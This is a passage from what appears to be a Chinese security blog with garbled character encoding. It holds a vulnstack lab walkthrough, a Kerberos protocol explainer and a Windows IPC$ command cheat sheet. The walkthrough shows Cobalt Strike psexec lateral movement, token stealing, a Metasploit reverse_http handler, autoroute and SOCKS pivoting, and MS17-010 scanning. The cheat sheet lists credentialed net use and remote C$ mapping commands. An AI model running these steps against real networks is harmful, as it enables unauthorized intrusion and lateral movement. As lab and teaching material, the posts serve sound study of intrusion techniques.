<h6 id="ä½¿ç”¨CSçš„psexec"><a href="#ä½¿ç”¨CSçš„psexec" class="headerlink" title="ä½¿ç”¨CSçš„psexec"></a>ä½¿ç”¨CSçš„psexec</h6><p>1.å…ˆåˆ›å»ºä¸€ä¸ªsmb beacon</p>
<p><img src="/posts/bb76ba56/cs_new_smbbeacon.png"></p>
<p>2.åœ¨å·²æœ‰çš„Beaconä¸Šå³é”®é€‰æ‹©Spawnmï¼Œé€‰æ‹©smb beaconçš„listener</p>
<p><img src="/posts/bb76ba56/cs_smb.png"></p>
<p>ç„¶ååç”Ÿæˆæ´¾ç”Ÿçš„smb beacon</p>
<p><img src="/posts/bb76ba56/cs_psexec1.png"></p>
<p><img src="/posts/bb76ba56/cs_psexec2.PNG"></p>
<p>3.ä½¿ç”¨å‡­è¯è¿æ¥å…¶ä»–å†…ç½‘æœºå™¨</p>
<p>åœ¨Targetsä¸­ é€‰æ‹©ä¸»æœºå³é”®<code>jump</code>-&gt; <code>psexec</code></p>
<p><img src="/posts/bb76ba56/cs_psexec3.PNG"></p>
<p><img src="/posts/bb76ba56/cs_psexec4.PNG"></p>
<p>æˆåŠŸç”¨æ­¤æ–¹æ³•è¿æ¥åˆ°OWAçš„beacon</p>
<p>ä½†æ˜¯åœ¨è¿æ¥ ROOT-TVI862UBEHæ—¶ï¼Œä¼šæŠ¥é”™ï¼Œå…·ä½“åŸå› è¿˜æ²¡æ‰¾åˆ°â€¦.æ±‚è§£å†³</p>
<p><img src="/posts/bb76ba56/cs_psexec_error.png"></p>
<p>4.å½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡çªƒå–GOD\Administratorçš„tokenæ¥ç™»å½•å…¶ä»–ä¸»æœº</p>
<p>é€‰æ‹©beaconå³é”®-&gt;Explore-&gt;Process List-&gt;æ‰¾åˆ°GOD\Administratorçš„è¿›ç¨‹ ç‚¹å‡»å³ä¸‹è§’çš„<code>steal token</code></p>
<p>ç„¶åè¿›å…¥targets-&gt;jump-&gt;psexec-&gt;å‹¾é€‰å·¦ä¸‹æ–¹çš„å‹¾ ä½¿ç”¨å½“å‰ä¼šè¯çš„tokenï¼Œè¿™ç§æ–¹æ³•å’Œå‰é¢çš„æ•ˆæœç›¸åŒ</p>
<br>

<h5 id="CSæ´¾ç”Ÿmsfä¼šè¯"><a href="#CSæ´¾ç”Ÿmsfä¼šè¯" class="headerlink" title="CSæ´¾ç”Ÿmsfä¼šè¯"></a>CSæ´¾ç”Ÿmsfä¼šè¯</h5><p>åœ¨CSä¸­åˆ›å»ºä¸€ç»™Foreign HTTP(s)</p>
<p><img src="/posts/bb76ba56/cs_msf1.png"> </p>
<p>åœ¨msfä¸­</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler </span><br><span class="line">msf exploit(multi/handler) &gt; set set payload windows/meterpreter/reverse_http</span><br><span class="line">set =&gt; payload windows/meterpreter/reverse_http</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 192.168.72.130</span><br><span class="line">lhost =&gt; 192.168.72.130</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 2222</span><br><span class="line">lport =&gt; 2222</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/bb76ba56/cs_msf2.png"></p>
<br>

<p>ä½¿ç”¨<code>run autoroute -s 192.168.72.0/24</code>æŠ¥é”™ åº”è¯¥æ˜¯åœ¨msf6ä¸­ç§»é™¤äº†</p>
<p><code>use post/multi/manage/autoroute</code> é€‰æ‹©autorouteæ¨¡å—æ·»åŠ è·¯ç”±</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 post(multi/manage/autoroute) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (post/multi/manage/autoroute):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   CMD      autoadd          yes       Specify the autoroute command (Accepted: add</span><br><span class="line">                                       , autoadd, print, delete, default)</span><br><span class="line">   NETMASK  255.255.255.0    no        Netmask (IPv4 as &quot;255.255.255.0&quot; or CIDR as</span><br><span class="line">                                       &quot;/24&quot;</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br><span class="line">   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)</span><br><span class="line"></span><br><span class="line">msf6 post(multi/manage/autoroute) &gt; set session 10</span><br><span class="line">session =&gt; 10</span><br><span class="line">msf6 post(multi/manage/autoroute) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (post/multi/manage/autoroute):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   CMD      autoadd          yes       Specify the autoroute command (Accepted: add</span><br><span class="line">                                       , autoadd, print, delete, default)</span><br><span class="line">   NETMASK  255.255.255.0    no        Netmask (IPv4 as &quot;255.255.255.0&quot; or CIDR as</span><br><span class="line">                                       &quot;/24&quot;</span><br><span class="line">   SESSION  10               yes       The session to run this module on.</span><br><span class="line">   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 post(multi/manage/autoroute) &gt; set subnet 192.168.52.0/24</span><br><span class="line">subnet =&gt; 192.168.52.0/24</span><br><span class="line">msf6 post(multi/manage/autoroute) &gt; run</span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module (incompatible session platform: windows)</span><br><span class="line">[*] Running module against STU1</span><br><span class="line">[*] Searching for subnets to autoroute.</span><br><span class="line"></span><br><span class="line">[+] Route added to subnet 169.254.0.0/255.255.0.0 from host&#x27;s routing table.</span><br><span class="line">[+] Route added to subnet 192.168.52.0/255.255.255.0 from host&#x27;s routing table.</span><br><span class="line">[+] Route added to subnet 192.168.72.0/255.255.255.0 from host&#x27;s routing table.</span><br><span class="line">[*] Post module execution completed</span><br><span class="line"></span><br><span class="line">msf6 post(multi/manage/autoroute) &gt; route print</span><br><span class="line"></span><br><span class="line">IPv4 Active Routing Table</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   169.254.0.0        255.255.0.0        Session 10</span><br><span class="line">   192.168.52.0       255.255.255.0      Session 10</span><br><span class="line">   192.168.72.0       255.255.255.0      Session 10</span><br><span class="line"></span><br><span class="line">[*] There are currently no IPv6 routes defined.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è®¾ç½®ä»£ç†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 post(multi/manage/autoroute) &gt; use auxiliary/server/socks_proxy</span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/server/socks_proxy):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   PASSWORD                   no        Proxy password for SOCKS5 listener</span><br><span class="line">   SRVHOST   0.0.0.0          yes       The address to listen on</span><br><span class="line">   SRVPORT   1080             yes       The port to listen on</span><br><span class="line">   USERNAME                   no        Proxy username for SOCKS5 listener</span><br><span class="line">   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Auxiliary action:</span><br><span class="line"></span><br><span class="line">   Name   Description</span><br><span class="line">   ----   -----------</span><br><span class="line">   Proxy  Run a SOCKS proxy server</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; set version 5</span><br><span class="line">version =&gt; 5</span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; run</span><br><span class="line">[*] Auxiliary module running as background job 0.</span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; </span><br><span class="line">[*] Starting the SOCKS proxy server</span><br><span class="line">Interrupt: use the &#x27;exit&#x27; command to quit</span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; run</span><br><span class="line">[*] Auxiliary module running as background job 1.</span><br><span class="line"></span><br><span class="line">[*] Starting the SOCKS proxy server</span><br><span class="line">[*] Stopping the SOCKS proxy server</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>é…ç½®proxychains4</p>
<p><code>sudo vim /etc/proxychains4.conf</code></p>
<p>æ·»åŠ  <code>socks5 127.0.0.1 1080</code></p>
<p>æµ‹è¯•æ˜¯å¦å¯ä»¥å»è®¿é—®å†…ç½‘</p>
<p><code>proxychains4 curl http://192.168.52.143/</code> æˆåŠŸè®¿é—®åˆ°</p>
<p><img src="/posts/bb76ba56/proxy.png"></p>
<p>ä½¿ç”¨ä»£ç†è®¿é—®å†…ç½‘ä¸­192.168.52.141çš„æœºå™¨</p>
<p><code>proxychains4 nmap -Pn -sT 192.168.52.141</code>nmapæ‰«æä¸€ä¸‹ç«¯å£ï¼Œæ‰«äº†å¾ˆé•¿æ—¶é—´â€¦â€¦</p>
<p><img src="/posts/bb76ba56/nmap_output.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Nmap scan report for 192.168.52.141</span><br><span class="line">Host is up (1.5s latency).</span><br><span class="line">Not shown: 987 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">21/tcp   open  ftp</span><br><span class="line">135/tcp  open  msrpc</span><br><span class="line">139/tcp  open  netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds</span><br><span class="line">777/tcp  open  multiling-http</span><br><span class="line">1025/tcp open  NFS-or-IIS</span><br><span class="line">1028/tcp open  unknown</span><br><span class="line">1029/tcp open  ms-lsa</span><br><span class="line">1030/tcp open  iad1</span><br><span class="line">6002/tcp open  X11:2</span><br><span class="line">7001/tcp open  afs3-callback</span><br><span class="line">7002/tcp open  afs3-prserver</span><br><span class="line">8099/tcp open  unknown</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥ä½¿ç”¨msfä¸­çš„<code>auxiliary/scanner/portscan/tcp</code>è·‘ä¸€ä¸‹å¼€æ”¾ç«¯å£</p>
<p><img src="/posts/bb76ba56/msf_portscan_tcp.png"></p>
<p>å…ˆåˆ©ç”¨smbæ‰«æç³»ç»Ÿç‰ˆæœ¬ <code>auxiliary/scanner/smb/smb_version</code></p>
<p><img src="/posts/bb76ba56/msf_smb.png"></p>
<p><img src="/posts/bb76ba56/msf_smb2.png"></p>
<p><img src="/posts/bb76ba56/msf_smb3.png"></p>
<p>ä½¿ç”¨msfæ‰«ææ¨¡å—æ£€æµ‹æ˜¯å¦å­˜åœ¨ms17-010æ¼æ´</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(server/socks_proxy) &gt; use /scanner/smb/smb_ms17_010</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/smb/smb_ms17_010):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting        Required  Description</span><br><span class="line">   ----         ---------------        --------  -----------</span><br><span class="line">   CHECK_ARCH   true                   no        Check for architecture on vulnerab</span><br><span class="line">                                                 le hosts</span><br><span class="line">   CHECK_DOPU   true                   no        Check for DOUBLEPULSAR on vulnerab</span><br><span class="line">                                                 le hosts</span><br><span class="line">   CHECK_PIPE   false                  no        Check for named pipe on vulnerable</span><br><span class="line">                                                  hosts</span><br><span class="line">   NAMED_PIPES  /usr/share/metasploit  yes       List of named pipes to check</span><br><span class="line">                -framework/data/wordl</span><br><span class="line">                ists/named_pipes.txt</span><br><span class="line">   RHOSTS       192.168.52.0/24        yes       The target host(s), range CIDR ide</span><br><span class="line">                                                 ntifier, or hosts file with syntax</span><br><span class="line">                                                  &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT        445                    yes       The SMB service port (TCP)</span><br><span class="line">   SMBDomain    .                      no        The Windows domain to use for auth</span><br><span class="line">                                                 entication</span><br><span class="line">   SMBPass                             no        The password for the specified use</span><br><span class="line">                                                 rname</span><br><span class="line">   SMBUser                             no        The username to authenticate as</span><br><span class="line">   THREADS      100                    yes       The number of concurrent threads (</span><br><span class="line">                                                 max one per host)</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; set rhosts 192.168.52.0/24</span><br><span class="line">rhosts =&gt; 192.168.52.0/24</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; set threads 500</span><br><span class="line">threads =&gt; 500</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 192.168.52.143:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 192.168.52.0/24:445   - Scanned  45 of 256 hosts (17% complete)</span><br><span class="line">[*] 192.168.52.0/24:445   - Scanned  52 of 256 hosts (20% complete)</span><br><span class="line">[*] 192.168.52.0/24:445   - Scanned  77 of 256 hosts (30% complete)</span><br><span class="line">[*] 192.168.52.0/24:445   - Scanned 114 of 256 hosts (44% complete)</span><br><span class="line">[*] 192.168.52.0/24:445   - Scanned 145 of 256 hosts (56% complete)</span><br><span class="line">[*] 192.168.52.0/24:445   - Scanned 154 of 256 hosts (60% complete)</span><br><span class="line">[-] 192.168.52.141:445    - An SMB Login Error occurred while connecting to the IPC$ tree.</span><br><span class="line">[*] 192.168.52.0/24:445   - Scanned 190 of 256 hosts (74% complete)</span><br><span class="line">[*] 192.168.52.0/24:445   - Scanned 205 of 256 hosts (80% complete)</span><br><span class="line">[*] 192.168.52.0/24:445   - Scanned 255 of 256 hosts (99% complete)</span><br><span class="line">[*] 192.168.52.0/24:445   - Scanned 256 of 256 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨ms17_010_command</p>
<p> <code>use auxiliary/admin/smb/ms17_010_command</code>ï¼Œä½†æ˜¯éƒ½åˆ©ç”¨å¤±è´¥äº†â€¦â€¦</p>
<p><img src="/posts/bb76ba56/ms17_010_error.png"></p>
]]></content>
      <categories>
        <category>vulnstack</category>
      </categories>
      <tags>
        <tag>vulnstack</tag>
      </tags>
  </entry>
  <entry>
    <title>Kerberosåè®®åˆ†æ</title>
    <url>/posts/e9f6bf8b/</url>
    <content><![CDATA[<h3 id="å‚ä¸è§’è‰²"><a href="#å‚ä¸è§’è‰²" class="headerlink" title="å‚ä¸è§’è‰²"></a>å‚ä¸è§’è‰²</h3><ul>
<li>Client</li>
<li>Server</li>
<li>KDC<ul>
<li>ADï¼šå­˜å‚¨æ‰€æœ‰Clientçš„ç™½åå•ï¼Œç”¨äºéªŒè¯Clientèº«ä»½</li>
<li>ASï¼šä¸ºClientç”ŸæˆTGT æœåŠ¡</li>
<li>TGSï¼šä¸ºClientç”ŸæˆæŸä¸ªæœåŠ¡çš„Ticket</li>
</ul>
</li>
</ul>
<h3 id="åè¯è§£é‡Š"><a href="#åè¯è§£é‡Š" class="headerlink" title="åè¯è§£é‡Š"></a>åè¯è§£é‡Š</h3><p>ASï¼šèº«ä»½è®¤è¯æœåŠ¡ï¼Œç”¨äºéªŒè¯Clientèº«ä»½</p>
<p>KDCï¼šå¯†é’¥åˆ†å‘ä¸­å¿ƒ</p>
<p>TGTï¼šç¥¨æ®ä¸­å¿ƒï¼Œè®¿é—®TGSçš„ç¥¨æ®</p>
<p>TGSï¼šç¥¨æ®æˆæƒæœåŠ¡</p>
<p>STï¼šè®¿é—®Serverçš„ç¥¨æ®</p>
<p>SessionKeyï¼šä¸´æ—¶ä¼šè¯å¯†é’¥aï¼ŒASç”Ÿæˆå‘é€ç»™å®¢æˆ·ç«¯(éšæœºå¯†é’¥)</p>
<p>ServerSessionKeyï¼šä¸´æ—¶ä¼šè¯å¯†é’¥bï¼ŒTGSç”Ÿæˆå‘é€ç»™å®¢æˆ·ç«¯(éšæœºå¯†é’¥)</p>
<h3 id="å…·ä½“æµç¨‹"><a href="#å…·ä½“æµç¨‹" class="headerlink" title="å…·ä½“æµç¨‹"></a>å…·ä½“æµç¨‹</h3><h4 id="Client-å‘KDC-ASç”³è¯·TGT"><a href="#Client-å‘KDC-ASç”³è¯·TGT" class="headerlink" title="Client å‘KDC-ASç”³è¯·TGT"></a>Client å‘KDC-ASç”³è¯·TGT</h4><h5 id="Client-gt-KDC-AS-AS-REQ"><a href="#Client-gt-KDC-AS-AS-REQ" class="headerlink" title="Client -&gt; KDC-AS (AS_REQ)"></a>Client -&gt; KDC-AS (AS_REQ)</h5><p>å‘é€AS_REQï¼š(è¢«ClientåŠ å¯†çš„æ—¶é—´æˆ³, å®¢æˆ·ç«¯ä¿¡æ¯, æœåŠ¡å™¨ç«¯ä¿¡æ¯)</p>
<p>KDC-ASè¿›è¡Œè®¤è¯ çœ‹æ˜¯å¦åœ¨ç™½åå•ä¸­</p>
<h5 id="KDC-AS-gt-Client-AS-REP"><a href="#KDC-AS-gt-Client-AS-REP" class="headerlink" title="KDC-AS -&gt; Client(AS_REP)"></a>KDC-AS -&gt; Client(AS_REP)</h5><p>å¦‚æœè®¤è¯é€šè¿‡ï¼ŒASä¼šéšæœºç”Ÿæˆä¸€ä¸ªå­—ç¬¦ä¸² <strong>Sessionkey</strong></p>
<p>å‘é€ä¸¤æ¡æ¶ˆæ¯</p>
<p>T(C)   Client Pass Hash(SessionKey)  ,ç”¨äºåç»­ä¸TGSæœåŠ¡é€šä¿¡</p>
<pre><code>å‘é€ SessionKey 
</code></pre>
<p>TGT   KDC Pass Hash(SessionKey, Clientä¿¡æ¯) ï¼Œä½œä¸ºå‘TGSç”³è¯·ç¥¨æ®çš„å‡­è¯</p>
<pre><code>å‘é€ SessionKey Clientä¿¡æ¯ ç»“æŸæ—¶é—´
</code></pre>
<h4 id="Clientå¾—åˆ°TGTåï¼Œå‘KDCè¯·æ±‚è®¿é—®serverçš„æƒé™ã€‚é€šè¿‡Clientå¾—åˆ°çš„TGTåˆ¤æ–­æ˜¯å¦å¯ä»¥æ‹¥æœ‰è®¿é—®Serverçš„æƒé™ï¼Œå¦‚æœå¯ä»¥å°±ç»™Clientè®¿é—®Serveræƒé™çš„ticket"><a href="#Clientå¾—åˆ°TGTåï¼Œå‘KDCè¯·æ±‚è®¿é—®serverçš„æƒé™ã€‚é€šè¿‡Clientå¾—åˆ°çš„TGTåˆ¤æ–­æ˜¯å¦å¯ä»¥æ‹¥æœ‰è®¿é—®Serverçš„æƒé™ï¼Œå¦‚æœå¯ä»¥å°±ç»™Clientè®¿é—®Serveræƒé™çš„ticket" class="headerlink" title="Clientå¾—åˆ°TGTåï¼Œå‘KDCè¯·æ±‚è®¿é—®serverçš„æƒé™ã€‚é€šè¿‡Clientå¾—åˆ°çš„TGTåˆ¤æ–­æ˜¯å¦å¯ä»¥æ‹¥æœ‰è®¿é—®Serverçš„æƒé™ï¼Œå¦‚æœå¯ä»¥å°±ç»™Clientè®¿é—®Serveræƒé™çš„ticket"></a>Clientå¾—åˆ°TGTåï¼Œå‘KDCè¯·æ±‚è®¿é—®serverçš„æƒé™ã€‚é€šè¿‡Clientå¾—åˆ°çš„TGTåˆ¤æ–­æ˜¯å¦å¯ä»¥æ‹¥æœ‰è®¿é—®Serverçš„æƒé™ï¼Œå¦‚æœå¯ä»¥å°±ç»™Clientè®¿é—®Serveræƒé™çš„ticket</h4><h5 id="Client-gt-KDC-TGS-TGS-REQ"><a href="#Client-gt-KDC-TGS-TGS-REQ" class="headerlink" title="Client -&gt; KDC-TGS (TGS_REQ)"></a>Client -&gt; KDC-TGS (TGS_REQ)</h5><p>å®¢æˆ·ç«¯ä½¿ç”¨NTLM Hashè§£å¯†T(C) å¾—åˆ°<strong>SessionKey</strong></p>
<p>Client å‘ TGS å‘é€æ¶ˆæ¯</p>
<pre><code>TGT

SessionKey(Clientä¿¡æ¯,æ—¶é—´æˆ³) å¯ä»¥è®°ä½œè®¤è¯å› å­ï¼Œä½¿ç”¨SessionKeyè¿›è¡ŒåŠ å¯†

Clientä¿¡æ¯

Serverä¿¡æ¯
</code></pre>
<h5 id="KDC-TGS-gt-Client-TGS-REP"><a href="#KDC-TGS-gt-Client-TGS-REP" class="headerlink" title="KDC-TGS -&gt; Client(TGS_REP)"></a>KDC-TGS -&gt; Client(TGS_REP)</h5><p>KDCä½¿ç”¨NTLMHashè§£å¯† TGT å¾—åˆ° (SessionKeyï¼ŒClientä¿¡æ¯ï¼Œç»“æŸæ—¶é—´)</p>
<p>ç„¶åä½¿ç”¨SessionKeyè§£å¯† è®¤è¯å› å­ å¾—åˆ°(Clientä¿¡æ¯ï¼Œæ—¶é—´æˆ³)</p>
<p>æ ¡éªŒ æ—¶é—´æˆ³ä¸å½“å‰æ—¶é—´ å’Œè§£å¯†TGTåçš„Clientä¿¡æ¯ä¸SessionKeyè§£å¯†åçš„Clientä¿¡æ¯</p>
<p>æ ¡éªŒé€šè¿‡åï¼Œä¼šåˆ¤æ–­å®¢æˆ·ç«¯æœ‰æ²¡æœ‰æƒé™è®¿é—®æœåŠ¡ç«¯    </p>
<p>è®¤è¯é€šè¿‡åï¼ŒKDC ä¼šç”ŸæˆServerSessionKey(éšæœºç”Ÿæˆ)</p>
<p>å‘é€RGS_REP:</p>
<p>SessionKey(ServerSessionKey, Clientä¿¡æ¯ï¼Œç¥¨æ®åˆ°æœŸæ—¶é—´)  ï¼ˆä½¿ç”¨SessionKeyåŠ å¯†çš„ServerSessionKey ï¼‰</p>
<p>ST (ServerSessionKey, å®¢æˆ·ä¿¡æ¯ ï¼Œç¥¨æ®åˆ°æœŸæ—¶é—´)  </p>
<p>ç¥¨æ®åˆ°æœŸæ—¶é—´å¯ä»¥ç†è§£æˆTGSç”Ÿå‘½å‘¨æœŸ</p>
<h4 id="Clientå¾—åˆ°STåï¼Œå¯ä»¥è®¿é—®server"><a href="#Clientå¾—åˆ°STåï¼Œå¯ä»¥è®¿é—®server" class="headerlink" title="Clientå¾—åˆ°STåï¼Œå¯ä»¥è®¿é—®server"></a>Clientå¾—åˆ°STåï¼Œå¯ä»¥è®¿é—®server</h4><p>Client æ”¶åˆ°ä¿¡æ¯åï¼Œä½¿â½¤Session Keyè§£å¯†è·å¾— (ServerSessionKey, Clientä¿¡æ¯ï¼ŒTGSç”Ÿå‘½å‘¨æœŸï¼‰</p>
<h5 id="Client-gt-Server-AP-REQ"><a href="#Client-gt-Server-AP-REQ" class="headerlink" title="Client -&gt; Server (AP-REQ)"></a>Client -&gt; Server (AP-REQ)</h5><p>å‘é€AP-REQ:</p>
<pre><code>ST

ServerSessionKey(å®¢æˆ·ä¿¡æ¯, ç¥¨æ®åˆ°æœŸæ—¶é—´) è®°ä½œè®¤è¯å› å­2ï¼Œä½¿ç”¨ServerSessionKeyåŠ å¯†
</code></pre>
<h5 id="Server-gt-Client-AP-REP"><a href="#Server-gt-Client-AP-REP" class="headerlink" title="Server -&gt; Client(AP-REP)"></a>Server -&gt; Client(AP-REP)</h5><p>Serverä½¿ç”¨NTLM Hashè§£å¯†ST å¾—åˆ° (ServerSessionKey,  Clientä¿¡æ¯ï¼Œç¥¨æ®åˆ°æœŸæ—¶é—´)</p>
<p>ç”¨ServerSessionKeyè§£å¯†è®¤è¯å› å­2 å¾—åˆ° (Clientä¿¡æ¯ï¼Œç¥¨æ®åˆ°æœŸæ—¶é—´)</p>
<p>ç„¶åå†æ ¡éªŒæ—¶é—´æˆ³å’ŒClientä¿¡æ¯</p>
<p>æ ¡éªŒé€šè¿‡åï¼Œå®¢æˆ·ç«¯å³å¯è®¿é—®æœåŠ¡ç«¯</p>
]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>å†…ç½‘æ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>å¸¸ç”¨Windowsè¿œç¨‹è¿æ¥å’Œç›¸å…³å‘½ä»¤</title>
    <url>/posts/9527b68a/</url>
    <content><![CDATA[<h3 id="IPC-å…±äº«è¿æ¥"><a href="#IPC-å…±äº«è¿æ¥" class="headerlink" title="IPC$å…±äº«è¿æ¥"></a>IPC$å…±äº«è¿æ¥</h3><p>IPC$ ï¼ˆInternet Process Connection) å…±äº«â€å‘½åç®¡é“â€çš„èµ„æºï¼Œä¸ºå®ç°è¿›ç¨‹é—´é€šä¿¡è€Œå¼€æ”¾çš„é€šé“ã€‚ä½¿ç”¨è¯¥å‘½ä»¤å¯ä»¥ä¸ç›®æ ‡ä¸»æœºå»ºç«‹è¿æ¥ï¼Œå»ºç«‹è¿æ¥åå¯ä»¥è®¿é—®ç›®æ ‡ä¸»æœºçš„æ–‡ä»¶ï¼Œè¿›è¡Œä¸‹è½½ã€ä¸Šä¼ ã€å‘½ä»¤æ‰§è¡Œç­‰æ“ä½œã€‚</p>
<br>

<h4 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h4><ul>
<li>ç›®æ ‡ä¸»æœºå¼€å¯139ï¼Œ445ç«¯å£</li>
<li>ç›®æ ‡ä¸»æœºç®¡ç†å‘˜å¼€å¯<code>IPC$</code>é»˜è®¤å…±äº«æœåŠ¡</li>
<li>çŸ¥é“ç›®æ ‡ä¸»æœºçš„è´¦å·å¯†ç </li>
</ul>
<br>

<h4 id="æ“ä½œå‘½ä»¤"><a href="#æ“ä½œå‘½ä»¤" class="headerlink" title="æ“ä½œå‘½ä»¤"></a>æ“ä½œå‘½ä»¤</h4><h5 id="æŸ¥çœ‹Windowsé»˜è®¤å¼€å¯çš„å…±äº«"><a href="#æŸ¥çœ‹Windowsé»˜è®¤å¼€å¯çš„å…±äº«" class="headerlink" title="æŸ¥çœ‹Windowsé»˜è®¤å¼€å¯çš„å…±äº«"></a>æŸ¥çœ‹Windowsé»˜è®¤å¼€å¯çš„å…±äº«</h5><p><code>net share</code> </p>
<h5 id="æŸ¥çœ‹å½“å‰ä¸»æœºæ‰€å»ºç«‹çš„è¿æ¥"><a href="#æŸ¥çœ‹å½“å‰ä¸»æœºæ‰€å»ºç«‹çš„è¿æ¥" class="headerlink" title="æŸ¥çœ‹å½“å‰ä¸»æœºæ‰€å»ºç«‹çš„è¿æ¥"></a>æŸ¥çœ‹å½“å‰ä¸»æœºæ‰€å»ºç«‹çš„è¿æ¥</h5><p><code>net use</code></p>
<h4 id="ç¡®å®šä¸»æœºæ—¶é—´"><a href="#ç¡®å®šä¸»æœºæ—¶é—´" class="headerlink" title="ç¡®å®šä¸»æœºæ—¶é—´"></a>ç¡®å®šä¸»æœºæ—¶é—´</h4><p><code>net time \\ip </code></p>
<h4 id="å¼€å¯-å…³é—­IPC-å…±äº«"><a href="#å¼€å¯-å…³é—­IPC-å…±äº«" class="headerlink" title="å¼€å¯/å…³é—­IPC$å…±äº«"></a>å¼€å¯/å…³é—­IPC$å…±äº«</h4><p><code>net share ipc$</code> </p>
<p><code>net share ipc$ /del</code></p>
<h5 id="å»ºç«‹ç©ºè¿æ¥"><a href="#å»ºç«‹ç©ºè¿æ¥" class="headerlink" title="å»ºç«‹ç©ºè¿æ¥"></a>å»ºç«‹ç©ºè¿æ¥</h5><p><code>net use \\127.0.0.1\ipc$  &quot;&quot;  /user:&quot;&quot; </code></p>
<h5 id="å»ºç«‹å®Œæ•´çš„ç”¨æˆ·å-å¯†ç IPC-è¿æ¥"><a href="#å»ºç«‹å®Œæ•´çš„ç”¨æˆ·å-å¯†ç IPC-è¿æ¥" class="headerlink" title="å»ºç«‹å®Œæ•´çš„ç”¨æˆ·å å¯†ç IPC$è¿æ¥"></a>å»ºç«‹å®Œæ•´çš„ç”¨æˆ·å å¯†ç IPC$è¿æ¥</h5><p><code>net use \\10.10.0.164\ipc$ &quot;password&quot;  /user:&quot;username&quot; </code></p>
<h5 id="åˆ é™¤IPC-è¿æ¥"><a href="#åˆ é™¤IPC-è¿æ¥" class="headerlink" title="åˆ é™¤IPC$è¿æ¥"></a>åˆ é™¤IPC$è¿æ¥</h5><p><code>net use \\127.0.0.1\ipc$ /del</code></p>
<h5 id="è·¯å¾„æ˜ å°„"><a href="#è·¯å¾„æ˜ å°„" class="headerlink" title="è·¯å¾„æ˜ å°„"></a>è·¯å¾„æ˜ å°„</h5><p><code>net use z: \\10.10.0.164\c$  &quot;password&quot; /user:&quot;username&quot; </code> æŠŠç›®æ ‡ä¸»æœºçš„cç›˜æ˜ å°„åˆ°æœ¬åœ°ä¸»æœºçš„zç›˜(æ²¡æœ‰å»ºç«‹ipcè¿æ¥æƒ…å†µä¸‹)</p>
<p><code>net use z: \\10.10.0.164\c$</code>ï¼ˆå·²ç»å»ºç«‹ipcè¿æ¥çš„æƒ…å†µä¸‹ï¼‰</p>
<p><img src="/posts/9527b68a/yingshe.png"></p>
<h5 id="åˆ é™¤æ˜ å°„çš„zç›˜"><a href="#åˆ é™¤æ˜ å°„çš„zç›˜" class="headerlink" title="åˆ é™¤æ˜ å°„çš„zç›˜"></a>åˆ é™¤æ˜ å°„çš„zç›˜</h5><p><code>net use z: /del </code></p>
<h5 id="åˆ é™¤å…¨éƒ¨"><a href="#åˆ é™¤å…¨éƒ¨" class="headerlink" title="åˆ é™¤å…¨éƒ¨"></a>åˆ é™¤å…¨éƒ¨</h5><p><code>net use * /del</code></p>
